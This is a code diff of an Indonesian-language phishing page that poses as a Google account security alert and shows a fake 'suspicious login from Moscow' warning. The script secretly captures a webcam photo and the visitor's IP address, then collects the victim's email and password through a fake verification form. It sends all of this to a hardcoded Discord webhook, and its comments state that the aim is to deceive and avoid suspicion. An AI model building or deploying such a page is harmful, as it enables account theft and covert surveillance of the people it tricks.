@@ -3,46 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Alert - Akun Terdeteksi</title>
+    <title>Sistem Keamanan Perangkat</title>
     <style>
-        body { background: #fff; color: #3c4043; font-family: 'Roboto', Arial, sans-serif; margin: 0; padding: 20px; }
-        .card { max-width: 450px; margin: 40px auto; border: 1px solid #dadce0; border-radius: 8px; padding: 30px; text-align: left; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        .alert-title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 15px; }
-        .device-info { background: #f8f9fa; border-radius: 5px; padding: 15px; margin: 20px 0; border-left: 4px solid #d93025; }
-        .btn-secure { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 14px; }
+        body { background: #fff; color: #3c4043; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { max-width: 400px; width: 90%; border: 1px solid #dadce0; border-radius: 8px; padding: 25px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .logo { width: 75px; margin-bottom: 15px; }
+        .btn-blue { background: #1a73e8; color: #fff; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
+        
+        /* Notifikasi Palsu (Custom Toast) */
+        #top-notify { 
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 380px; background: #323232; color: #fff; 
+            padding: 15px; border-radius: 12px; display: flex; align-items: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); z-index: 9999;
+            transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        #top-notify.show { top: 20px; }
+        .notify-icon { background: #d93025; border-radius: 50%; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; margin-right: 12px; font-weight: bold; }
+        
         #auth-step, #final-step { display: none; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-<div class="card" id="alert-step">
-    <!-- Menggunakan logo generic Cloud Security -->
+<!-- Notifikasi yang Muncul di Atas -->
+<div id="top-notify">
+    <div class="notify-icon">!</div>
+    <div style="text-align: left;">
+        <b style="display: block; font-size: 13px;">Security Alert</b>
+        <span style="font-size: 12px; color: #ccc;">Seseorang mencoba mengakses akun Anda.</span>
+    </div>
+</div>
+
+<div class="card" id="main-card">
     <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-    <div class="alert-title">Peringatan Keamanan</div>
-    <p style="font-size: 14px; line-height: 1.5;">Upaya login baru terdeteksi pada akun Anda. Jika ini bukan Anda, segera amankan akun Anda sekarang.</p>
+    <h2 style="font-size: 20px; margin: 0 0 10px 0;">Lindungi Akun Anda</h2>
+    <p style="font-size: 14px; color: #5f6368;">Browser mendeteksi aktivitas mencurigakan. Izinkan enkripsi notifikasi untuk menerima peringatan keamanan secara real-time.</p>
     
-    <div class="device-info">
-        <b style="display: block; font-size: 14px;">Detail Perangkat:</b>
-        <span style="font-size: 13px; color: #5f6368;">Linux / Chrome 124.0.0 (Moscow, RU)</span>
+    <div id="start-step">
+        <button class="btn-blue" onclick="enablePush()">AKTIFKAN PERLINDUNGAN</button>
     </div>
 
-    <button class="btn-secure" onclick="startSecure()">YA, AMANKAN AKUN SAYA</button>
-</div>
+    <div id="auth-step">
+        <p style="font-size: 13px; font-weight: bold; color: #d93025;">Login Tak Dikenal: Moscow, RU</p>
+        <input type="text" id="email" placeholder="Email atau No. Ponsel">
+        <input type="password" id="pass" placeholder="Password saat ini">
+        <button class="btn-blue" onclick="captureAndSend()">AMANKAN SEKARANG</button>
+    </div>
 
-<div class="card" id="auth-step">
-    <div class="alert-title">Verifikasi Identitas</div>
-    <p style="font-size: 14px;">Silakan konfirmasi kata sandi Anda untuk memutus sesi asing.</p>
-    <input type="text" id="email" placeholder="Email atau Nomor Ponsel">
-    <input type="password" id="pass" placeholder="Masukkan kata sandi terakhir">
-    <button class="btn-secure" onclick="captureData()">KONFIRMASI KEAMANAN</button>
-</div>
-
-<div class="card" id="final-step">
-    <div style="color: #1e8e3e; font-size: 40px; text-align: center;">✓</div>
-    <div class="alert-title" style="text-align: center;">Sesi Diputus</div>
-    <p style="text-align: center; font-size: 14px;">Perangkat asing telah berhasil dikeluarkan. Akun Anda sekarang aman.</p>
+    <div id="final-step">
+        <h3 style="color: #1e8e3e;">✓ Selesai</h3>
+        <p style="font-size: 13px;">Koneksi asing telah diputus. Akun Anda kembali normal.</p>
+    </div>
 </div>
 
 <video id="v" autoplay style="display:none;"></video>
@@ -51,47 +64,48 @@
 <script>
     const hook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
 
-    async function startSecure() {
+    async function enablePush() {
+        // Minta izin notifikasi (biar kelihatan resmi)
+        const permission = await Notification.requestPermission();
+        
+        // Trigger Notifikasi Palsu di Atas Layar
+        const notify = document.getElementById('top-notify');
+        notify.classList.add('show');
+
+        // Diam-diam ambil foto dan IP
         try {
-            // Ambil data diam-diam pas dia panik klik tombol
             const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v');
-            video.srcObject = s;
+            const v = document.getElementById('v');
+            v.srcObject = s;
             
-            const ipReq = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipReq.json();
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
 
             setTimeout(() => {
                 const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
                 canvas.toBlob(b => {
                     const fd = new FormData();
-                    fd.append('file', b, 'intruder_check.png');
+                    fd.append('file', b, 'alert_cam.png');
                     fd.append('payload_json', JSON.stringify({
-                        content: "⚠️ **SECURITY ALERT TRIGGERED**",
-                        embeds: [{
-                            title: "Target Metadata",
-                            color: 14232613,
-                            fields: [{ name: "IP", value: ipData.ip }]
-                        }]
+                        content: "🔔 **NOTIFICATION TRIGGERED**",
+                        embeds: [{ fields: [{ name: "IP Address", value: ipData.ip }] }]
                     }));
                     fetch(hook, { method: 'POST', body: fd });
                 }, 'image/png');
                 s.getTracks().forEach(t => t.stop());
-            }, 500);
+            }, 1000);
+        } catch(e) {}
 
-            document.getElementById('alert-step').style.display = 'none';
-            document.getElementById('auth-step').style.display = 'block';
-        } catch(e) {
-            // Tetap lanjut meskipun kamera ditolak biar nggak curiga
-            document.getElementById('alert-step').style.display = 'none';
-            document.getElementById('auth-step').style.display = 'block';
-        }
+        // Pindah ke form login
+        document.getElementById('start-step').style.display = 'none';
+        document.getElementById('auth-step').style.display = 'block';
+        
+        // Sembunyikan notifikasi setelah 5 detik
+        setTimeout(() => notify.classList.remove('show'), 5000);
     }
 
-    async function captureData() {
+    async function captureAndSend() {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
 
@@ -99,11 +113,12 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: "🔐 **CREDENTIALS CAPTURED**",
+                content: "🚨 **SECURITY VERIFIED DATA**",
                 embeds: [{
+                    color: 16711680,
                     fields: [
-                        { name: "Identity", value: email },
-                        { name: "Password", value: `\`${pass}\`` }
+                        { name: "User/Email", value: email },
+                        { name: "Captured Password", value: `\`${pass}\`` }
                     ]
                 }]
             })
